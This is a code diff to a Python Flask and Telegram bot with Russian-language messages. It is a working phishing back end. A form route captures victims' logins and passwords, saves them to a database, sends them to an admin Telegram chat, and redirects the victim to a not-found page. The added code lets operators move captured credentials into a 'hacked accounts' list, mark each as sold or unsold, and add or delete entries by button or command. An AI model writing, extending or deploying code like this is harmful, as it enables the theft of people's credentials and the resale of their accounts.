@@ -121,6 +121,80 @@ def save_user(chat_id, prefix, subscription_end):
         print(f"Error saving user {chat_id}: {e}")
         conn.close()
 
+def save_credentials(login, password):
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to save credentials: no DB connection")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
+                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
+                  (login, password, datetime.now().isoformat(), password, datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        print(f"Credentials saved: login={login}, password={password}")
+        return True
+    except Exception as e:
+        print(f"Error saving credentials: {e}")
+        conn.close()
+        return False
+
+def delete_credentials(login):
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to delete credentials: no DB connection")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
+        conn.commit()
+        conn.close()
+        print(f"Credentials deleted: login={login}")
+        return True
+    except Exception as e:
+        print(f"Error deleting credentials: {e}")
+        conn.close()
+        return False
+
+def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to save hacked account: no DB connection")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
+                  "VALUES (%s, %s, %s, %s, %s, %s) "
+                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
+                  (login, password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id,
+                   password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id))
+        conn.commit()
+        conn.close()
+        print(f"Hacked account saved: login={login}, password={password}, sold_status={sold_status}")
+        return True
+    except Exception as e:
+        print(f"Error saving hacked account: {e}")
+        conn.close()
+        return False
+
+def delete_hacked_account(login):
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to delete hacked account: no DB connection")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
+        conn.commit()
+        conn.close()
+        print(f"Hacked account deleted: login={login}")
+        return True
+    except Exception as e:
+        print(f"Error deleting hacked account: {e}")
+        conn.close()
+        return False
+
 def get_credentials():
     conn = get_db_connection()
     if conn is None:
@@ -209,7 +283,10 @@ def submit():
         password = request.form.get('password')
         if login and password:
             print(f"Received login: {login}, password: {password}")
-            bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
+            if save_credentials(login, password):
+                bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
+            else:
+                print("Failed to save credentials to DB")
         return redirect(url_for('not_found'))
     except Exception as e:
         print(f"Error in /submit: {e}")
@@ -225,8 +302,8 @@ def webhook():
         json_string = request.get_data().decode('utf-8')
         print(f"Received webhook data: {json_string}")
         update = telebot.types.Update.de_json(json_string)
-        if update and update.message:
-            print(f"Processing update: {update.message.text}")
+        if update and (update.message or update.callback_query):
+            print(f"Processing update: {update}")
             bot.process_new_updates([update])
         else:
             print("No valid update found in webhook data")
@@ -276,7 +353,6 @@ def menu_cmd(message):
         time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
         response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
         
-        # Перевірка техперериву
         global tech_break
         if tech_break:
             tech_time_left = (tech_break - datetime.now()).total_seconds() / 60
@@ -335,7 +411,7 @@ def techstop_cmd(message):
         bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
         return
     minutes = int(args[0])
-    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)  # +2 часа для часового пояса
+    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)
     bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')} (UTC+2)")
 
 @bot.message_handler(commands=['techstopoff'])
@@ -363,9 +439,14 @@ def passwords_cmd(message):
         bot.reply_to(message, "📂 Список паролей пуст.")
         return
     response = "🔑 Список паролей:\n"
+    markup = types.InlineKeyboardMarkup()
     for login, password, added_time in credentials:
         response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
-    bot.reply_to(message, response)
+        markup.add(
+            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_cred_{login}"),
+            types.InlineKeyboardButton(f"Взломать {login}", callback_data=f"hack_cred_{login}")
+        )
+    bot.reply_to(message, response, reply_markup=markup)
 
 @bot.message_handler(commands=['hacked'])
 def hacked_cmd(message):
@@ -377,13 +458,93 @@ def hacked_cmd(message):
         return
     hacked_accounts = get_hacked_accounts()
     if not hacked_accounts:
-        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
+        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.", reply_markup=markup)
         return
     response = "🔓 Взломанные аккаунты:\n"
+    markup = types.InlineKeyboardMarkup()
     for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
         response += (f"Логин: {login} | Пароль: {password} | Дата: {hack_date} | "
                      f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
-    bot.reply_to(message, response)
+        markup.add(
+            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
+        )
+    markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
+    bot.reply_to(message, response, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    chat_id = str(call.message.chat.id)
+    print(f"Processing callback for chat_id: {chat_id}, data: {call.data}")
+    
+    if call.data.startswith("delete_cred_"):
+        login = call.data[len("delete_cred_"):]
+        if delete_credentials(login):
+            bot.edit_message_text(f"✅ Логин {login} удален из списка паролей.", 
+                                 chat_id, call.message.message_id)
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
+    
+    elif call.data.startswith("hack_cred_"):
+        login = call.data[len("hack_cred_"):]
+        credentials = get_credentials()
+        for cred_login, cred_password, _ in credentials:
+            if cred_login == login:
+                markup = types.InlineKeyboardMarkup()
+                markup.add(
+                    types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{cred_password}_Продан_{chat_id}"),
+                    types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{cred_password}_Не продан_{chat_id}")
+                )
+                bot.edit_message_text(f"🔓 Укажите статус для {login}:", chat_id, call.message.message_id, reply_markup=markup)
+                bot.answer_callback_query(call.id)
+                break
+    
+    elif call.data.startswith("hack_"):
+        parts = call.data.split("_")
+        login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
+        user = get_user(chat_id)
+        if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id) and delete_credentials(login):
+            bot.edit_message_text(f"✅ {login} добавлен в список взломанных со статусом {sold_status}.", 
+                                 chat_id, call.message.message_id)
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ Ошибка при добавлении.")
+    
+    elif call.data == "add_hacked":
+        bot.edit_message_text("Введите данные в формате: /addhacked <логин> <пароль>", chat_id, call.message.message_id)
+        bot.answer_callback_query(call.id)
+    
+    elif call.data.startswith("delete_hacked_"):
+        login = call.data[len("delete_hacked_"):]
+        if delete_hacked_account(login):
+            bot.edit_message_text(f"✅ Логин {login} удален из списка взломанных.", 
+                                 chat_id, call.message.message_id)
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
+
+@bot.message_handler(commands=['addhacked'])
+def add_hacked_cmd(message):
+    chat_id = str(message.chat.id)
+    print(f"Processing /addhacked for chat_id: {chat_id}")
+    access = check_access(chat_id, 'hacked')
+    if access:
+        bot.reply_to(message, access)
+        return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
+    if len(args) != 2:
+        bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>")
+        return
+    login, password = args[0], args[1]
+    user = get_user(chat_id)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
+        types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
+    )
+    bot.reply_to(message, f"🔓 Укажите статус для {login}:", reply_markup=markup)
 
 @bot.message_handler(commands=['database'])
 def database_cmd(message):
